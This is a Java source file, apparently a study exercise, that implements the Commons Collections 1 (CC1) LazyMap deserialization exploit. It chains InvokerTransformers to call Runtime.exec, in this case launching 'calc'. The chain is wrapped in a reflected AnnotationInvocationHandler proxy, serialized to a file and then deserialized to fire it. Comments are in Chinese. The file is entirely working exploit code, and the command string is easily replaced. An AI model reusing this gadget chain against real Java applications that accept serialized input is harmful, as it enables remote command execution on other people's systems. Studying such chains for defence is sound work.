package com.pwjcw.test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMapExploit {

    public static void main(String[] args) throws Exception {
        // 1. 构造恶意Transformer链（执行命令）
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"} // 执行的命令
                )
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        // 2. 创建LazyMap并设置触发键
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        lazyMap.put("trigger", "anything"); // 需要触发get("trigger")

        // 3. 创建动态代理对象（代理Map接口）
        InvocationHandler handler = getAnnotationInvocationHandler(Override.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler
        );

        // 4. 构造外层AnnotationInvocationHandler（反序列化入口）
        InvocationHandler payload = getAnnotationInvocationHandler(Override.class, proxyMap);

        // 5. 序列化payload对象
        serialize(payload, "cc1.bin");

        // 6. 反序列化触发漏洞（模拟攻击）
        deserialize("cc1.bin");
    }

    // 反射获取AnnotationInvocationHandler实例,将lazymap设置为其的memberValues
    private static InvocationHandler getAnnotationInvocationHandler(Class<?> annotationClass, Map map) throws Exception {
        Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                .getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        return (InvocationHandler) constructor.newInstance(annotationClass, map);
    }

    // 序列化对象到文件
    private static void serialize(Object obj, String filename) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(obj);
        oos.close();
    }

    // 反序列化文件触发漏洞
    private static void deserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}